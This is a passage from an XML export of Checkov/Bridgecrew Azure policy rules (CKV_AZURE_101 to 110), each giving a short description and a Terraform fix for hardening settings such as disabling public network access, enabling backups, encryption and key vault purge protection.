      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cosmos-db-accounts-do-not-have-customer-managed-keys-encrypting-data-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cosmos-db-accounts-do-not-have-customer-managed-keys-encrypting-data-at-rest"></div>Cosmos DB Accounts do not have customer-managed keys encrypting data at rest</div><a aria-label="Skip link to Cosmos DB Accounts do not have customer-managed keys encrypting data at rest" class="heading-anchor-icon fa fa-anchor" href="#cosmos-db-accounts-do-not-have-customer-managed-keys-encrypting-data-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Data stored in Azure Cosmos account is automatically encrypted with keys managed by Microsoft (service-managed keys). Customer-managed keys (CMKs) give users total control over the keys used by Azure Cosmos DB to encrypt their data at rest. Built as an additional encryption layer on top of the Azure Cosmos DB default encryption at rest with service managed keys, it uses Azure Key Vault to store encryption keys and provides a way to implement double encryption.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_cosmosdb_account</li>
<li><strong>Argument:</strong> key_vault_key_id - (Optional) A versionless Key Vault Key ID for CMK encryption. Changing this forces a new resource to be created.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cosmosdb_account" "db" {
  name                = "tfex-cosmos-db-${random_integer.ri.result}"
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name
  offer_type          = "Standard"
  kind                = "GlobalDocumentDB"

  enable_automatic_failover = true

  capabilities {
    name = "EnableAggregationPipeline"
  }

  capabilities {
    name = "mongoEnableDocLevelTTL"
  }

  capabilities {
    name = "MongoDBv3.4"
  }

  consistency_policy {
    consistency_level       = "BoundedStaleness"
    max_interval_in_seconds = 10
    max_staleness_prefix    = 200
  }

  geo_location {
    location          = var.failover_location
    failover_priority = 1
  }

  geo_location {
    location          = azurerm_resource_group.rg.location
    failover_priority = 0
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cosmos-db-accounts-have-customer-managed-keys-to-encrypt-data-at-rest' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cosmos-db-accounts-have-customer-managed-keys-to-encrypt-data-at-rest</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cosmos-db-accounts-have-customer-managed-keys-to-encrypt-data-at-rest' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_101</key>
    <name>Ensure Azure Cosmos DB disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-cosmos-db-enables-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-cosmos-db-enables-public-network-access"></div>Azure Cosmos DB enables public network access</div><a aria-label="Skip link to Azure Cosmos DB enables public network access" class="heading-anchor-icon fa fa-anchor" href="#azure-cosmos-db-enables-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>We recommend that you ensure your Azure Cosmos DB Disables Public Network Access.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_cosmosdb_account</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cosmosdb_account" "db" {
        ...
 +    public_network_access_enabled = false

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-cosmos-db-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-cosmos-db-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-cosmos-db-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_102</key>
    <name>Ensure PostgreSQL server enables geo-redundant backups</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postgresql-server-disables-geo-redundant-backups"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postgre-sql-server-disables-geo-redundant-backups"></div>PostgreSQL server disables geo-redundant backups</div><a aria-label="Skip link to PostgreSQL server disables geo-redundant backups" class="heading-anchor-icon fa fa-anchor" href="#postgresql-server-disables-geo-redundant-backups"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure PostgreSQL allows you to choose between locally redundant or geo-redundant backup storage in the General Purpose and Memory Optimized tiers. When the backups are stored in geo-redundant backup storage, they are not only stored within the region in which your server is hosted, but are also replicated to a paired data center. This provides better protection and ability to restore your server in a different region in the event of a disaster. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_postgresql_server</li>
<li><strong>Argument:</strong> geo_redundant_backup_enabled - (Optional) Turn Geo-redundant server backups on/off. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_postgresql_server" "example" {
  ...
+ geo_redundant_backup_enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-geo-redundant-backups' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-geo-redundant-backups</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-geo-redundant-backups' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_103</key>
    <name>Ensure Azure Data Factory uses Git repository for source control</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-data-factory-does-not-use-git-repository-for-source-control"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-data-factory-does-not-use-git-repository-for-source-control"></div>Azure Data Factory does not use Git repository for source control</div><a aria-label="Skip link to Azure Data Factory does not use Git repository for source control" class="heading-anchor-icon fa fa-anchor" href="#azure-data-factory-does-not-use-git-repository-for-source-control"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Data Factory is an ETL service for  serverless data integration and data transformation. Azure Data Factory allows you to configure a Git repository with either Azure Repos or GitHub. Git is a version control system that allows for easier change tracking and collaboration.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_data_factory</li>
<li><strong>Argument:</strong> github_configuration - (Optional) A github_configuration block as defined below.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_data_factory" "example" {
  ....
    github_configuration {
    account_name    = "${var.account_name}"
    branch_name     = "${var.branch_name}"
    git_url         = "${var.git_url}"
    repository_name = "${var.repository_name}"
    root_folder     = "${var.root_folder}"
  }

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-uses-git-repository-for-source-control' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-uses-git-repository-for-source-control</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-uses-git-repository-for-source-control' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_104</key>
    <name>Ensure Azure Data factory public network access is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-data-factory-v2-configured-with-overly-permissive-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-data-factory-v-2-configured-with-overly-permissive-network-access"></div>Azure Data Factory (V2) configured with overly permissive network access</div><a aria-label="Skip link to Azure Data Factory (V2) configured with overly permissive network access" class="heading-anchor-icon fa fa-anchor" href="#azure-data-factory-v2-configured-with-overly-permissive-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>We recommend that you ensure your Azure Data Factory Public Network Access is disabled.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_data_factory</li>
<li><strong>Argument:</strong> public_network_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_data_factory" "example" {
              ...
+             public_network_enabled = false
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-public-network-access-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-public-network-access-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-factory-public-network-access-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_105</key>
    <name>Ensure Data Lake Store accounts enable encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="unencrypted-data-lake-store-accounts"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-unencrypted-data-lake-store-accounts"></div>Unencrypted Data Lake Store accounts </div><a aria-label="Skip link to Unencrypted Data Lake Store accounts " class="heading-anchor-icon fa fa-anchor" href="#unencrypted-data-lake-store-accounts"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>&#8206;Azure Data Lake Storage Gen2 is a set of capabilities dedicated to big data analytics, built on Azure Blob storage. Data Lake Storage Gen2 converges the capabilities of Azure Data Lake Storage Gen1 with Azure Blob storage. Data Lake Storage Gen1 supports encryption of data both at rest and in transit. For data at rest, Data Lake Storage Gen1 supports "on by default," transparent encryption. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> xyz</li>
<li><strong>Argument:</strong> encryption_state - (Optional) Is Encryption enabled on this Data Lake Store Account? Possible values are Enabled or Disabled. Defaults to Enabled.</li>
</ul>
<p>encryption_type - (Optional) The Encryption Type used for this Data Lake Store Account. Currently can be set to ServiceManaged when encryption_state is Enabled - and must be a blank string when it's Disabled.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_data_lake_store" "example" {
  ...
  encryption_state    = "Enabled"
  encryption_type     = "ServiceManaged"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-data-lake-store-accounts-enables-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-data-lake-store-accounts-enables-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-data-lake-store-accounts-enables-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_106</key>
    <name>Ensure Azure Event Grid domain public network access is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-event-grid-domain-public-network-access-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-event-grid-domain-public-network-access-is-enabled"></div>Azure Event Grid domain public network access is enabled</div><a aria-label="Skip link to Azure Event Grid domain public network access is enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-event-grid-domain-public-network-access-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_eventgrid_domain</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_eventgrid_domain" "example" {
              ...
+             public_network_access_enabled = false
              }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-event-grid-domain-public-network-access-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-event-grid-domain-public-network-access-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-event-grid-domain-public-network-access-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_107</key>
    <name>Ensure API management services use virtual networks</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="api-management-services-do-not-use-virtual-networks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-api-management-services-do-not-use-virtual-networks"></div>API management services do not use virtual networks</div><a aria-label="Skip link to API management services do not use virtual networks" class="heading-anchor-icon fa fa-anchor" href="#api-management-services-do-not-use-virtual-networks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_api_management</li>
<li><strong>Argument:</strong>  virtual_network_configuration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_api_management" "example" {
                  ...
 +                virtual_network_configuration {
                    subnet_id = azure_subnet.subnet_not_public_ip.id 
                  }
                  ....
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-api-management-services-uses-virtual-networks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-api-management-services-uses-virtual-networks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-api-management-services-uses-virtual-networks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_108</key>
    <name>Ensure Azure IoT Hub disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-iot-hub-enables-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-io-t-hub-enables-public-network-access"></div>Azure IoT Hub enables public network access</div><a aria-label="Skip link to Azure IoT Hub enables public network access" class="heading-anchor-icon fa fa-anchor" href="#azure-iot-hub-enables-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_iothub</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_iothub" "example" {
                ...
+             public_network_access_enabled = false
              route {
                name           = "export"
                source         = "DeviceMessages"
                condition      = "true"
                endpoint_names = ["export"]
                enabled        = true
              }
                        ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-iot-hub-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-iot-hub-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-iot-hub-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_109</key>
    <name>Ensure key vault allows firewall rules settings</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="key-vault-does-not-allow-firewall-rules-settings"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-key-vault-does-not-allow-firewall-rules-settings"></div>Key vault does not allow firewall rules settings</div><a aria-label="Skip link to Key vault does not allow firewall rules settings" class="heading-anchor-icon fa fa-anchor" href="#key-vault-does-not-allow-firewall-rules-settings"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Key vault's firewall prevents unauthorized traffic from reaching your key vault and provides an additional layer of protection for your secrets. Enable the firewall to make sure that only traffic from allowed networks can access your key vault. By defining "bypass=AzureServices" and "default_action= "deny" - only matched ip_rules and/or virtual_network_subnet_ids will be passed</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_key_vault</li>
<li><strong>Argument:</strong> network_acls.default_action</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault" "example" {
                  ...
 +                network_acls {
 +                  default_action = "Deny"
 +                  bypass = "AzureServices" 
                  }
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-allows-firewall-rules-settings' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-key-vault-allows-firewall-rules-settings</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-allows-firewall-rules-settings' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_110</key>
    <name>Ensure key vault enables purge protection</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="key-vault-disables-purge-protection"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-key-vault-disables-purge-protection"></div>Key vault disables purge protection</div><a aria-label="Skip link to Key vault disables purge protection" class="heading-anchor-icon fa fa-anchor" href="#key-vault-disables-purge-protection"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Purge protection is an optional Key Vault behavior and is not enabled by default. Purge protection can only be enabled once soft-delete is enabled. It can be turned on via CLI or PowerShell. When purge protection is on, a vault or an object in the deleted state cannot be purged until the retention period has passed. Soft-deleted vaults and objects can still be recovered, ensuring that the retention policy will be followed. The default retention period is 90 days, but it is possible to set the retention policy interval to a value from 7 to 90 days through the Azure portal. Once the retention policy interval is set and saved it cannot be changed for that vault.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_key_vault</li>
<li><strong>Argument:</strong> purge_protection_enabled - (Optional) Is Purge Protection enabled for this Key Vault? Defaults to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault" "example" {
        ...
+  purge_protection_enabled    = true
}
